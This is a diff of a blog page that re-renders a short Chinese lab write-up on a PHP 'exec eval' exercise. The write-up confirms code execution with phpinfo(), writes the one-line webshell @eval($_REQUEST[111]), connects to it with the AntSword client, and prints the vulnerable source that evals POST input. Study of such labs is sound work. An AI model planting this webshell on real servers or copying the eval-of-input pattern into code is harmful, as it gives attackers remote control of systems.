@@ -56,25 +56,13 @@
     </div>
   </header>
   <div class="article-content">
-    
-# exec "eval"
-
-1.输入phpinfo();，发现代码执行了，说明此处存在RCE漏洞
-
-2.写入一句话木马php @eval($_REQUEST[111])
-
-3.用蚁剑连接
-
-# 注：
-
-1.源代码分析
-
+    <h1 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h1><p>1.输入phpinfo();，发现代码执行了，说明此处存在RCE漏洞</p>
+<p>2.写入一句话木马php @eval($_REQUEST[111])</p>
+<p>3.用蚁剑连接</p>
+<h1 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h1><p>1.源代码分析</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(@!<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-直接执行用户输入的数据
-
-
-
+<p>直接执行用户输入的数据</p>
 
   </div>
 </article>
